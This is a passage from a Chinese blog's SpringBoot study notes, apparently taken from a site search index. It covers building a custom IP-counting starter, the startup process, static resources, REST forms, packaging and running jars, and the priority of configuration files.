print(){\nif(ipProperties.getModel().equals(IpProperties.LogModel.DETAIL.getValue())){\n            System.out.println(\"         IP访问监控\");\n            System.out.println(\"+-----ip-address-----+--num--+\");\n            for (Map.Entry<String, Integer> entry : ipCountMap.entrySet()) {\n                String key = entry.getKey();\n                Integer value = entry.getValue();\n                System.out.println(String.format(\"|%18s  |%5d  |\",key,value));\n            }\n            System.out.println(\"+--------------------+-------+\");\n        }else if(ipProperties.getModel().equals(IpProperties.LogModel.SIMPLE.getValue())){\n            System.out.println(\"     IP访问监控\");\n            System.out.println(\"+-----ip-address-----+\");\n            for (String key: ipCountMap.keySet()) {\n                System.out.println(String.format(\"|%18s  |\",key));\n            }\n            System.out.println(\"+--------------------+\");\n        }\n        //阶段内统计数据归零\n        if(ipProperties.getCycleReset()){\n            ipCountMap.clear();\n        }\n    }\n}\n```\n\n**当前效果**：在web程序端可以通过控制yml文件中的配置参数对统计信息进行格式控制。但是数据显示周期还未进行控制。\n\n## ④使用属性设置定时器参数\n\n在使用属性配置中的显示周期数据时，遇到了一些问题。由于无法在@Scheduled注解上直接使用配置数据，改用曲线救国的方针，放弃使用@EnableConfigurationProperties注解对应的功能，改成最原始的bean定义格式。\n\n**步骤一：属性类定义bean并指定bean的访问名称**\n\n如果此处不设置bean的访问名称，spring会使用自己的命名生成器生成bean的长名称，无法实现属性的读取\n\n```java\n@Component(\"ipProperties\")\n@ConfigurationProperties(prefix = \"tools.ip\")\npublic class IpProperties {\n}\n```\n\n**步骤二：@Scheduled注解使用`#{}`读取bean属性值**\n\n此处读取bean名称为ipProperties的bean的cycle属性值\n\n```java\n@Scheduled(cron = \"0/#{ipProperties.cycle} * * * * ?\")\npublic void print(){\n}\n```\n\n**步骤三：弃用@EnableConfigurationProperties注解对应的功能，改为导入bean的形式加载配置属性类**\n\n```java\n@EnableScheduling\n//@EnableConfigurationProperties(IpProperties.class)\n@Import(IpProperties.class)\npublic class IpAutoConfiguration {\n    @Bean\n    public IpCountService ipCountService(){\n        return new IpCountService();\n    }\n}\n```\n\n**当前效果**：在web程序端可以通过控制yml文件中的配置参数对统计信息的显示周期进行控制\n\n## ⑤使用拦截器开发\n\n目前基础功能基本上已经完成了制作，下面进行拦截器的开发。使用拦截器后使用时不需要再引入对象调用方法了，导入 starter 即可实现功能。\n\n**步骤一：开发拦截器**\n\n使用自动装配加载统计功能的业务类，并在拦截器中调用对应功能\n\n```java\npublic class IpCountInterceptor implements HandlerInterceptor {\n    @Autowired\n    private IpCountService ipCountService;\n    @Override\n    public boolean preHandle(HttpServletRequest request, \n                             HttpServletResponse response, Object handler) throws Exception {\n        ipCountService.count();\n        return true;\n    }\n}\n```\n\n**步骤二：配置拦截器**\n\n配置mvc拦截器，设置拦截对应的请求路径。此处拦截所有请求，用户可以根据使用需要设置要拦截的请求。甚至可以在此处加载IpCountProperties中的属性，通过配置设置拦截器拦截的请求。\n\n```java\n@Configuration\npublic class SpringMvcConfig implements WebMvcConfigurer {\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        registry.addInterceptor(ipCountInterceptor()).addPathPatterns(\"/**\");\n    }\n    @Bean\n    public IpCountInterceptor ipCountInterceptor(){\n        return new IpCountInterceptor();\n    }\n}\n```\n\n**步骤三：去除之前的方法**\n\n```java\n@RestController\n@RequestMapping(\"/books\")\npublic class BookController {\n    //@Autowired 去掉\n    //private IpCountService ipCountService; 去掉\n    @GetMapping(\"{currentPage}/{pageSize}\")\n    public R getPage(@PathVariable int currentPage,@PathVariable int pageSize,Book book){\n        //ipCountService.count();  去掉\n        IPage<Book> page = bookService.getPage(currentPage, pageSize,book);\n        if( currentPage > page.getPages()){\n            page = bookService.getPage((int)page.getPages(), pageSize,book);\n        }\n        return new R(true, page);\n    }\n}\n```\n\n**当前效果**：在web程序端导入对应的starter后功能开启，去掉坐标后功能消失，实现自定义starter的效果。\n\n## ⑥开启yml提示功能\n\n我们在使用springboot的配置属性时，都可以看到提示，导入了对应的starter后，也会有对应的提示信息出现。但是现在我们的starter没有对应的提示功能，这种设定就非常的不友好，本节解决自定义starter功能如何开启配置提示的问题。springboot提供有专用的工具实现此功能，仅需导入下列坐标。\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-configuration-processor</artifactId>\n</dependency>\n```\n\n程序编译后，在target/META-INF目录中会生成对应的`json`提示文件，然后拷贝`json`文件到自己开发的META-INF目录中，并对其进行自定义编辑。生成的信息来自于属性类的注释信息。打开生成的`json`文件，可以看到如下信息。\n\n```JAVA\n{\n  \"groups\": [\n    {\n      \"name\": \"tools.ip\",\n      \"type\": \"com.jianjian.properties.IpProperties\",\n      \"sourceType\": \"com.jianjian.properties.IpProperties\"\n    }\n  ],\n  \"properties\": [\n    {\n      \"name\": \"tools.ip.cycle\",\n      \"type\": \"java.lang.Long\",\n      \"description\": \"日志显示周期\",\n      \"sourceType\": \"com.jianjian.properties.IpProperties\",\n      \"defaultValue\": 5\n    },\n    {\n      \"name\": \"tools.ip.cycle-reset\",\n      \"type\": \"java.lang.Boolean\",\n      \"description\": \"是否周期内重置数据\",\n      \"sourceType\": \"com.jianjian.properties.IpProperties\",\n      \"defaultValue\": false\n    },\n    {\n      \"name\": \"tools.ip.model\",\n      \"type\": \"java.lang.String\",\n      \"description\": \"日志输出模式  detail：详细模式  simple：极简模式\",\n      \"sourceType\": \"com.jianjian.properties.IpProperties\"\n    }\n  ],\n  \"hints\": [\n    {\n      \"name\": \"tools.ip.model\",\n      \"values\": [\n        {\n          \"value\": \"detail\",\n          \"description\": \"详细模式.\"\n        },\n        {\n          \"value\": \"simple\",\n          \"description\": \"极简模式.\"\n        }\n      ]\n    }\n  ]\n}\n```\n\n- `groups属性`定义了当前配置的提示信息总体描述，当前配置属于哪一个属性封装类，\n\n- `properties属性`描述了当前配置中每一个属性的具体设置，包含名称、类型、描述、默认值等信息。\n- `hints属性`默认是空白的，没有进行设置。`hints属性`可以参考springboot源码中的制作，设置当前属性封装类专用的提示信息，上面为日志输出模式属性model设置了两种可选提示信息。\n\n**总结**\n\n1. 自定义starter其实就是做一个独立的功能模块，核心技术是利用自动配置的效果在加载模块后加载对应的功能\n2. 通常会为自定义starter的自动配置功能添加足够的条件控制，而不会做成100%加载对功能的效果\n3. 本例中使用map保存数据，如果换用redis方案，在starter开发模块中就要导入redis对应的starter\n4. 对于配置属性务必开启提示功能，否则使用者无法感知配置应该如何书写\n\n到此当前案例全部完成，自定义stater的开发其实在第一轮开发中就已经完成了，就是创建独立模块导出独立功能，需要使用的位置导入对应的starter即可。如果是在企业中开发，记得不仅需要将开发完成的starter模块install到自己的本地仓库中，开发完毕后还要deploy到私服上，否则别人无法使用。\n\n\n\n```bash\n\n```\n\n\n\n# 3.SpringBoot程序启动\n\n## ①启动过程分析\n\n> 不管是springboot程序还是spring程序，启动过程本质上都是在做容器的初始化，并将对应的bean初始化出来放入容器。在spring环境中，每个bean的初始化都要开发者自己添加设置，但是切换成springboot程序后，自动配置功能的添加帮助开发者提前预设了很多bean的初始化过程，加上各种各样的参数设置，使得整体初始化过程显得更简单，但是核心本质还是在做一件事，初始化容器。\n\n作为开发者只要搞清楚springboot提供了哪些参数设置的环节，同时初始化容器的过程中都做了哪些事情就行了。springboot初始化的参数根据参数的提供方，划分成如下3个大类，每个大类的参数又被封装了各种各样的对象，具体如下：\n\n- 环境属性（Environment）\n- 系统配置（spring.factories）\n- 参数（Arguments、application.properties）\n\n以下通过代码流向介绍了springboot程序启动时每一环节做的具体事情。\n\n```java\nSpringboot30StartupApplication【10】->SpringApplication.run(Springboot30StartupApplication.class, args);\n    SpringApplication【1332】->return run(new Class<?>[] { primarySource }, args);\n        SpringApplication【1343】->return new SpringApplication(primarySources).run(args);\n            SpringApplication【1343】->SpringApplication(primarySources)\n            # 加载各种配置信息，初始化各种配置对象\n                SpringApplication【266】->this(null, primarySources);\n                    SpringApplication【280】->public SpringApplication(ResourceLoader resourceLoader, Class<?>... primarySources)\n                        SpringApplication【281】->this.resourceLoader = resourceLoader;\n                        # 初始化资源加载器\n                        SpringApplication【283】->this.primarySources = new LinkedHashSet<>(Arrays.asList(primarySources));\n                        # 初始化配置类的类名信息（格式转换）\n                        SpringApplication【284】->this.webApplicationType = WebApplicationType.deduceFromClasspath();\n                        # 确认当前容器加载的类型\n                        SpringApplication【285】->this.bootstrapRegistryInitializers = getBootstrapRegistryInitializersFromSpringFactories();\n                        # 获取系统配置引导信息\n                        SpringApplication【286】->setInitializers((Collection) getSpringFactoriesInstances(ApplicationContextInitializer.class));\n                        # 获取ApplicationContextInitializer.class对应的实例\n                        SpringApplication【287】->setListeners((Collection) getSpringFactoriesInstances(ApplicationListener.class));\n                        # 初始化监听器，对初始化过程及运行过程进行干预\n                        SpringApplication【288】->this.mainApplicationClass = deduceMainApplicationClass();\n                        # 初始化了引导类类名信息，备用\n            SpringApplication【1343】->new SpringApplication(primarySources).run(args)\n            # 初始化容器，得到ApplicationContext对象\n                SpringApplication【323】->StopWatch stopWatch = new StopWatch();\n                # 设置计时器\n                SpringApplication【324】->stopWatch.start();\n                # 计时开始\n                SpringApplication【325】->DefaultBootstrapContext bootstrapContext = createBootstrapContext();\n                # 系统引导信息对应的上下文对象\n                SpringApplication【327】->configureHeadlessProperty();\n                # 模拟输入输出信号，避免出现因缺少外设导致的信号传输失败，进而引发错误（模拟显示器，键盘，鼠标...）\n                    java.awt.headless=true\n                SpringApplication【328】->SpringApplicationRunListeners listeners = getRunListeners(args);\n                # 获取当前注册的所有监听器\n                SpringApplication【329】->listeners.starting(bootstrapContext, this.mainApplicationClass);\n                # 监听器执行了对应的操作步骤\n                SpringApplication【331】->ApplicationArguments applicationArguments = new DefaultApplicationArguments(args);\n                # 获取参数\n                SpringApplication【333】->ConfigurableEnvironment environment = prepareEnvironment(listeners, bootstrapContext, applicationArguments);\n                # 将前期读取的数据加载成了一个环境对象，用来描述信息\n                SpringApplication【333】->configureIgnoreBeanInfo(environment);\n                # 做了一个配置，备用\n                SpringApplication【334】->Banner printedBanner = printBanner(environment);\n                # 初始化logo\n                SpringApplication【335】->context = createApplicationContext();\n                # 创建容器对象，根据前期配置的容器类型进行判定并创建\n                SpringApplication【363】->context.setApplicationStartup(this.applicationStartup);\n                # 设置启动模式\n                SpringApplication【337】->prepareContext(bootstrapContext, context, environment, listeners, applicationArguments, printedBanner);\n                # 对容器进行设置，参数来源于前期的设定\n                SpringApplication【338】->refreshContext(context);\n                # 刷新容器环境\n                SpringApplication【339】->afterRefresh(context, applicationArguments);\n                # 刷新完毕后做后处理\n                SpringApplication【340】->stopWatch.stop();\n                # 计时结束\n                SpringApplication【341】->if (this.logStartupInfo) {\n                # 判定是否记录启动时间的日志\n                SpringApplication【342】->    new StartupInfoLogger(this.mainApplicationClass).logStarted(getApplicationLog(), stopWatch);\n                # 创建日志对应的对象，输出日志信息，包含启动时间\n                SpringApplication【344】->listeners.started(context);\n                # 监听器执行了对应的操作步骤\n                SpringApplication【345】->callRunners(context, applicationArguments);\n                # 调用运行器\n                SpringApplication【353】->listeners.running(context);\n                # 监听器执行了对应的操作步骤\n```\n\n上述过程描述了springboot程序启动过程中做的所有的事情。\n\n## ②干预启动过程\n\n如果想干预springboot的启动过程，比如自定义一个数据库环境检测的程序，该如何将这个过程加入springboot的启动流程呢？遇到这样的问题，大部分技术是这样设计的，设计若干个标准接口，对应程序中的所有标准过程。当你想干预某个过程时，实现接口就行了。例如spring技术中bean的生命周期管理就是采用标准接口进行的。\n\n```java\npublic class Abc implements InitializingBean, DisposableBean {\n    public void destroy() throws Exception {\n        //销毁操作\n    }\n    public void afterPropertiesSet() throws Exception {\n        //初始化操作\n    }\n}\n```\n\nspringboot启动过程由于存在着大量的过程阶段，如果设计接口就要设计十余个标准接口，这样对开发者不友好，同时整体过程管理分散，十余个过程各自为政，管理难度大，过程过于松散。那springboot如何解决这个问题呢？它采用了一种最原始的设计模式来解决这个问题，这就是`监听器模式`，使用监听器来解决这个问题。\n\nspringboot将自身的启动过程比喻成一个大的事件，该事件是由若干个小的事件组成的。例如：\n\n- org.springframework.boot.context.event.ApplicationStartingEvent\n  - 应用启动事件，在应用运行但未进行任何处理时，将发送 ApplicationStartingEvent\n- org.springframework.boot.context.event.ApplicationEnvironmentPreparedEvent\n  - 环境准备事件，当Environment被使用，且上下文创建之前，将发送 ApplicationEnvironmentPreparedEvent\n- org.springframework.boot.context.event.ApplicationContextInitializedEvent\n  - 上下文初始化事件\n- org.springframework.boot.context.event.ApplicationPreparedEvent\n  - 应用准备事件，在开始刷新之前，bean定义被加载之后发送 ApplicationPreparedEvent\n- org.springframework.context.event.ContextRefreshedEvent\n  - 上下文刷新事件\n- org.springframework.boot.context.event.ApplicationStartedEvent\n  - 应用启动完成事件，在上下文刷新之后且所有的应用和命令行运行器被调用之前发送 ApplicationStartedEvent\n- org.springframework.boot.context.event.ApplicationReadyEvent\n  - 应用准备就绪事件，在应用程序和命令行运行器被调用之后，将发出 ApplicationReadyEvent，用于通知应用已经准备处理请求\n- org.springframework.context.event.ContextClosedEvent（上下文关闭事件，对应容器关闭）\n\n上述列出的仅仅是部分事件，当应用启动后走到某一个过程点时，监听器监听到某个事件触发，就会执行对应的事件。除了系统内置的事件处理，用户就可以根据需要自定义开发当前事件触发时要做的动作。\n\n```JAVA\n//设定监听器，在应用启动开始事件时进行功能追加\npublic class MyListener implements ApplicationListener<ApplicationStartingEvent> {\n    public void onApplicationEvent(ApplicationStartingEvent event) {\n\t\t//自定义事件处理逻辑\n    }\n}\n```\n\n按照上述方案处理，用户就可以干预springboot启动过程的所有工作节点，设置自己的业务系统中独有的功能点。\n\n**总结**\n\n1. springboot启动流程是先初始化容器需要的各种配置，并加载成各种对象，初始化容器时读取这些对象，创建容器\n2. 整体流程采用事件监听的机制进行过程控制，开发者可以根据需要自行扩展，添加对应的监听器绑定具体事件，就可以在事件触发位置执行开发者的业务代码\n\n\n\n# 4.Web开发\n\n## 1.SpringMVC自动配置概览\n\n- 内容协商视图解析器和BeanName视图解析器\n\n- 静态资源（包括webjars）\n- 自动注册 `Converter，GenericConverter，Formatter `\n- 支持 `HttpMessageConverters` \n- 自动注册 `MessageCodesResolver` （国际化）\n- 静态index.html 页支持\n- 自定义 `Favicon`\n- 自动使用 `ConfigurableWebBindingInitializer` （DataBinder负责将请求数据绑定到JavaBean上）\n\n## 2.静态资源访问\n\n### a.静态资源目录\n\n**默认静态资源路径**：  `/static` or `/public` or `/resources` or `/META-INF/resources`\n\n**访问 ：** `当前项目根路径/静态资源名`   例如：127.0.0.1/jianjian.png\n\n**原理：**当请求进来时，先去找 Controller 看能不能处理。不能处理的所有请求又都交给静态资源处理器。静态资源也找不到则响应404页面。\n\n**修改默认的静态资源路径**，/static，/public，resources，/META-INF/resources 将失效\n\n```yaml\nspring:\n\tweb:\n\t\tresources:\n  \t\tstatic-locations: [classpath:/jianjian/]\n```\n\n**静态资源访问前缀**\n\n```yaml\nspring:\n  mvc:\n    static-path-pattern: /res/**\n```\n\n访问 ：`当前项目根路径 + static-path-pattern + 静态资源名`\n\n例如：127.0.0.1/res/jianjian.png\n\n**webjar**\n\n可用jar方式添加css，js等资源文件，webjar 查找：https://www.webjars.org/，例如，添加jquery\n\n```xml\n<dependency>\n    <groupId>org.webjars</groupId>\n    <artifactId>jquery</artifactId>\n    <version>3.5.1</version>\n</dependency>\n```\n\n访问：`localhost:8080/webjars/jquery/3.5.1/jquery.js` ，后面地址要按照依赖里面的包路径。\n\n### b.欢迎页支持\n\n- 静态资源路径下 index.html\n  - 可以配置静态资源路径\n  - 配置**静态资源的访问前缀**，会导致 index.html不能被默认访问\n\n```yaml\nspring:\n#  mvc:\n#    static-path-pattern: /res/**   这个会导致欢迎页功能失效\n\tweb:\n\t\tresources:\n\t\t\tstatic-locations: [classpath:/haha/]\n```\n\n- controller处理index\n\n```java\n@RequestMapping(\"/\")\npublic String home(){\n  return \"index\";\n}\n```\n\n### c.自定义Favicon\n\n将 favicon.ico 放在静态资源目录下即可，但是配置**静态资源访问前缀**会导致 Favicon 功能失效\n\n```yaml\nspring:\n#  mvc:\n#    static-path-pattern: /res/**   这个会导致 Favicon 功能失效\n```\n\n### d.静态资源配置原理\n\n。。。\n\n## 3.请求参数处理\n\n### a.rest使用与原理\n\n- @xxxMapping\n\n  - @GetMapping\n  - @PostMapping\n  - @PutMapping\n  - @DeleteMapping\n\n- Rest风格支持（*使用**HTTP**请求方式动词来表示对资源的操作*）\n\n  - 以前：\n    - `/getUser`  获取用户  \n    - `/deleteUser` 删除用户   \n    - `/editUser`  修改用户     \n    - `/saveUser` 保存用户\n\n  - 现在： `/user`   \n    -  GET-获取用户    \n    -  DELETE-删除用户    \n    -  PUT-修改用户   \n    -  POST-保存用户\n\n- 核心Filter：HiddenHttpMethodFilter\n\n**用法**\n\n- 1.开启页面表单的Rest功能\n\n```yaml\nspring:\n  mvc:\n    hiddenmethod:\n      filter:\n        enabled: true   #开启页面表单的Rest功能\n```\n\n- 2.页面 form的属性method=post，隐藏域 _method=put、delete等（如果直接get或post，无需隐藏域）\n\n```html\n<form action=\"/user\" method=\"get\">\n    <input value=\"REST-GET提交\" type=\"submit\" />\n</form>\n\n<form action=\"/user\" method=\"post\">\n    <input value=\"REST-POST提交\" type=\"submit\" />\n</form>\n\n<form action=\"/user\" method=\"post\">\n    <input name=\"_method\" type=\"hidden\" value=\"DELETE\"/>\n    <input value=\"REST-DELETE 提交\" type=\"submit\"/>\n</form>\n\n<form action=\"/user\" method=\"post\">\n    <input name=\"_method\" type=\"hidden\" value=\"PUT\" />\n    <input value=\"REST-PUT提交\"type=\"submit\" />\n<form>\n\n```\n\n- 3.编写请求映射\n\n```java\n    @RequestMapping(value = \"/user\",method = RequestMethod.GET)\n    public String getUser(){\n        return \"GET-张三\";\n    }\n\n    @RequestMapping(value = \"/user\",method = RequestMethod.POST)\n    public String saveUser(){\n        return \"POST-张三\";\n    }\n\n\n    @RequestMapping(value = \"/user\",method = RequestMethod.PUT)\n    public String putUser(){\n        return \"PUT-张三\";\n    }\n\n    @RequestMapping(value = \"/user\",method = RequestMethod.DELETE)\n    public String deleteUser(){\n        return \"DELETE-张三\";\n    }\n```\n\nRest原理（表单提交要使用REST的时候）\n\n- 表单提交会带上 `_method=PUT`\n\n- 请求过来被 `HiddenHttpMethodFilter`拦截，检测请求是否正常，并且是POST\n\n  - 获取到 `_method` 的值\n\n  - 兼容以下请求；**PUT**、**DELETE**、**PATCH**\n\n  - 原生request（post），包装模式 requesWrapper 重写了getMethod方法，返回的是传入的值( `_method`)。\n\n  - 过滤器链放行的时候用 wrapper。以后的方法调用getMethod是调用 requesWrapper \n\n### b.请求映射原理\n\n\n\n\n\n\n\n# Sponsor❤️\n\n您的支持是我不断前进的动力，如果您感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝</td>\n         <td style=\"text-align:center;\">微信</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringBoot"],"categories":["Spring"]},{"title":"SpringBoot-实用篇","url":"/posts/37881.html","content":"\n> 实用篇包含运维实用篇和开发实用篇，运维实用篇的定位是玩转配置；开发实用篇包含热部署、高级配置、测试进阶、内置数据层、监控等。\n\n小简从 0 开始学 Java 知识之 [Java-学习路线](https://jwt1399.top/posts/29829.html) 中的《SpringBoot-实用篇》，不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n- [x] 🚩时间安排：预计5天更新完\n- [x] 🎯开始时间：09-11\n- [x] 🎉结束时间：09-14\n- [x] 🍀总结：\n\n- 学习目标\n\n| 章节                                       | 学习目标                                                     |\n| ------------------------------------------ | ------------------------------------------------------------ |\n| <font color=\"#cc0000\"><b>应用篇</b></font> | 能够掌握SpringBoot程序多环境开发<br/>能够基于Linux系统发布SpringBoot工程<br/>能够解决线上灵活配置SpringBoot工程的需求 |\n\n# 运维实用篇\n\n## 1.打包与运行\n\n### ①程序打包\n\nSpringBoot程序是基于Maven创建的，在Maven中提供有打包的指令，叫做package。\n\n```java\nmvn package\n```\n\n本操作也可以在IDEA环境下执行。打包后会产生一个与工程名类似的jar文件，其名称是由`模块名+版本号+.jar`组成的。如果你写的测试类中有操作数据库的功能，打包时可以在IDEA->Maven中点击跳过测试按钮，再打包，来避免测试类影响数据库。\n\n<font color=\"#ff0000\"><b>特别关注</b></font>：在使用向导创建SpringBoot工程时，pom.xml文件中会有如下配置，这一段配置千万不能删除，否则打包后无法正常执行程序。\n\n```xml\n<build>\n    <plugins>\n        <plugin>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-maven-plugin</artifactId>\n        </plugin>\n    </plugins>\n</build>\n```\n\n###  ②程序运行\n\n- 1.安装JDK，且版本不低于打包时使用的JDK版本\n\n- 2.程序包保存在/usr/local/自定义目录中或$HOME下\n\n- 3.执行运行指令就可以了\n\n前台运行\n\n```bash\njava -jar 工程包名.jar\n```\n\n后台运行\n\n```bash\n$ nohup java -jar 工程包名.jar > server.log 2>&1 &\n\n#命令解释\n# nohup 英文全称 no hang up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行\n# 最后一个&表示把条命令放到后台执行\n# 2>&1表示把标准错误输出和标准输出都定向到log中\n```\n\n| 名称                 | 代码 | 操作符           | Java中表示 |\n| :------------------- | :--- | :--------------- | :--------- |\n| 标准输入(stdin)      | 0    | < 或 <<          | System.in  |\n| 标准输出(stdout)     | 1    | >, >>, 1> 或 1>> | System.out |\n| 标准错误输出(stderr) | 2    | 2> 或 2>>        | System.err |\n\n参考：[深入理解Linux shell中2>&1的含义](https://www.jb51.net/article/169778.htm)\n\n**总结**\n\n1. SpringBoot工程可以基于java环境下独立运行jar文件启动服务\n2. SpringBoot工程执行mvn命令package进行打包\n3. 执行jar命令：java –jar 工程名.jar\n\n### ③jar运行机制\n\n- jar包结构\n\n```powershell\n$ tree -L 2\n├── BOOT-INF\n│   ├── classes\n│   ├── classpath.idx\n│   ├── layers.idx\n│   └── lib\n├── META-INF\n│   ├── MANIFEST.MF\n│   └── maven\n└── org\n    └── springframework\n```\n\n- MANIFEST.MF 文件\n\n```yaml\nManifest-Version: 1.0\nSpring-Boot-Classpath-Index: BOOT-INF/classpath.idx\nImplementation-Title: springboot_08_ssmp\nImplementation-Version: 0.0.1-SNAPSHOT\nSpring-Boot-Layers-Index: BOOT-INF/layers.idx\nStart-Class: com.jianjian.SSMPApplication\nSpring-Boot-Classes: BOOT-INF/classes/\nSpring-Boot-Lib: BOOT-INF/lib/\nBuild-Jdk-Spec: 1.8\nSpring-Boot-Version: 2.5.4\nCreated-By: Maven Jar Plugin 3.2.0\nMain-Class: org.springframework.boot.loader.JarLauncher\n```\n\n- 运作机制\n\n1. `spring-boot-maven-plug`会打出一个特殊的包，包含Spring框架部分功能，原始工程内容，原始工程依赖的jar包\n2. 首先读取`MANIFEST.MF`文件中的`Main-Class`属性，用来标记执行java -jar命令后运行的类`JarLauncher`\n3. JarLauncher类执行时会找到`Start-Class`属性，也就是启动类类名\n4. 运行启动类时会运行当前工程的内容\n5. 运行当前工程时会使用依赖的jar包，从lib目录中查找\n\n### ④异常排查\n\n启动SpringBoot工程时，可能会遇到端口占用的问题。\n\n- windows版\n\n```bash\n# 查询指定端口\n$ netstat -ano |findstr \"端口号\"\n# 根据进程PID查询进程名称\n$ tasklist |findstr \"进程PID号\"\n# 根据PID杀死任务\n$ taskkill /F /PID \"进程PID号\"\n# 根据进程名称杀死任务\n$ taskkill -f -t -im \"进程名称\"\n```\n\n- Linux版\n\n```bash\n# 查询指定端口\n$ ps -ef | grep \"端口号\"\n# 根据进程PID查询进程名称\n$ ps -ef | grep \"进程PID号\"\n# 根据PID杀死任务\n$ kill -9 进程PID号\n# 根据进程名称杀死任务\n$ kill -9 进程名称\n```\n\n## 2.配置进阶\n\n### ①临时属性\n\n> 目前我们的程序包打好了，可以发布了。但是程序包打好以后，里面的配置都已经是固定的了，比如配置了服务器的端口是8080。如果我要启动项目，发现当前我的服务器上已经有应用启动起来并且占用了8080端口，这个时候就尴尬了。难道要重新把打包好的程序修改一下吗？比如我要把打包好的程序启动端口改成80。\n\n#### a.服务器中使用临时属性\n\nSpringBoot提供了灵活的配置方式，如果你发现你的项目中有个别属性需要重新配置，可以使用临时属性的方式快速修改某些配置。方法也特别简单，在启动的时候添加上对应参数就可以了。\n\n```bash\n$ java –jar springboot.jar –-server.port=80\n```\n\n如果你发现要修改的属性不止一个，可以按照上述格式继续写，属性与属性之间使用空格分隔。\n\n```bash\n$ java –jar springboot.jar –-server.port=80 --logging.level.root=debug\n```\n\n#### b.开发环境中使用临时属性\n\n打开SpringBoot引导类的运行界面，在里面找到配置项。其中Program arguments对应的位置就是添加临时属性的，可以加几个试试效果。\n\n![](https://img.jwt1399.top/img/202209131300448.png)\n\n做到这里其实可以产生一个思考了，如果对java编程熟悉的小伙伴应该知道，我们运行main方法的时候，如果想使用main方法的参数，也就是下面的args参数，就是在上面这个位置添加的参数。\n\n```java\npublic static void main(String[] args) {\n}\n```\n\n原来是这样，通过这个args就可以获取到参数。再来看我们的引导类是如何书写的\n\n```java\npublic static void main(String[] args) {\n    SpringApplication.run(SSMPApplication.class,args);\n}\n```\n\n这个args参数居然传递给了run方法，看来在Idea中配置的临时参数就是通过这个位置传递到我们的程序中的。言外之意，这里如果不用这个args是不是就断开了外部传递临时属性的入口呢？是这样的，我们可以使用下面的调用方式，这样外部临时属性就无法进入到SpringBoot程序中了。\n\n```java\npublic static void main(String[] args) {\n    SpringApplication.run(SSMPApplication.class);\n}\n```\n\n或者还可以使用如下格式来玩这个操作，就是将配置不写在配置文件中，直接写成一个字符串数组，传递给程序入口。当然，这种做法并没有什么实际开发意义。\n\n```java\npublic static void main(String[] args) {\n    String[] arg = new String[1];\n    arg[0] = \"--server.port=8082\";\n    SpringApplication.run(SSMPApplication.class, arg);\n}\n```\n\n### ②**属性加载优先级**\n\n现在我们的程序配置受两个地方控制了，第一配置文件，第二临时属性。并且我们发现临时属性的加载优先级要高于配置文件的。那是否还有其他的配置方式呢？有的\n\n打开官方文档中对应的内容，就可以查看配置读取的优先顺序。地址：[属性加载优先级 (spring.io)](https://docs.spring.io/spring-boot/docs/current/reference/html/features.html#features.external-config)\n\n![](https://img.jwt1399.top/img/202209111913476.png)\n\n有14种配置的位置，而我们现在使用的是这里面的2个。\n\n- 第3条Config data说的就是使用配置文件，\n\n- 第11条Command line arguments说的就是使用命令行临时参数。\n\n这14种配置的顺序就是SpringBoot加载配置的顺序，这个列表**上面的优先级低，下面的优先级高**。\n\n**总结**\n\n1. 使用jar命令启动SpringBoot工程时可以使用临时属性替换配置文件中的属性\n2. 临时属性添加方式：java –jar 工程名.jar –-属性名=值\n3. 多个临时属性之间使用空格分隔\n4. 临时属性必须是当前boot工程支持的属性，否则设置无效\n\n### ③配置文件级别\n\nSpringBoot提供4个级别配置文件。\n\n- 1.程序包所在目录中配置文件\n- 2.程序包所在目录中config目录下配置文件\n\n- 3.类路径下config目录下配置文件\n- 4.类路径下配置文件（一直使用的是这个，也就是resources目录中的application.yml文件）\n\n其实就是提供给了4种配置文件书写的位置。上面4个文件的加载优先顺序为\n\n- 1级    file ：config/application.yml **【最高】**\n\n- 2级    file ：application.yml\n\n- 3级    classpath：config/application.yml\n\n- 4级    classpath：application.yml  **【最低】**\n\n那为什么设计这种多种呢？说一个最典型的应用吧。\n\n- 场景A：你作为一个开发者，为了方便自己写代码，配置的数据库肯定是连接你自己本机的，咱们使用第4级别，也就是之前一直用的application.yml。\n- 场景B：现在项目开发到了一个阶段，要联调测试了，连接的数据库是测试服务器的数据库，肯定要换一组配置吧。你可以选择把你之前的文件中的内容都改了，目前还不麻烦。\n- 场景C：测试完了，一切OK。你继续写你的代码，你发现你原来写的配置文件被改成测试服务器的内容了，你要再改回来。现在明白了不？场景B中把你的内容都改掉了，你现在要重新改回来，以后呢？改来改去吗？\n\n解决方案很简单，用上面第3这个级别的配置文件就可以快速解决这个问题，再写一个配置就行了。两个配置文件共存，因为config目录中的配置加载优先级比你的高，所以配置项如果和级别4里面的内容相同就覆盖了，这样是不是很简单？\n\n级别1和2什么时候使用呢？程序打包以后就要用这个级别了，管你程序里面配置写的是什么？我的级别高，可以轻松覆盖你，就不用考虑这些配置冲突的问题了。\n\n**总结**\n\n1. 配置文件分为4种\n\n   - 项目类路径配置文件：开发人员本机开发与测试\n   - 项目类路径config目录中配置文件：项目经理整体调控\n   - 工程路径配置文件：运维人员配置涉密线上环境\n   - 工程路径config目录中配置文件：运维经理整体调控\n\n2. 多层级配置文件间的属性采用叠加并覆盖的形式作用于程序\n\n\n### ④自定义配置文件\n\n之前使用的配置文件都是application.yml，其实这个文件也是可以改名字的，这样方便维护。比如我2020年4月1日搞活动，走了一组配置，2020年5月1日活动取消，恢复原始配置，这个时候只需要重新更换一下配置文件就可以了。但是你总不能在原始配置文件上修改吧，不然搞完活动以后，活动的配置就留不下来了，不利于维护。\n\n自定义配置文件方式有如下两种：\n\n- **方式一：使用临时属性设置配置文件名，注意仅仅是名称，不要带扩展名**\n\n```bash\n--spring.config.name=不带后缀的配置文件名字\n```\n\n![](https://img.jwt1399.top/img/202209111933227.png)\n\n- 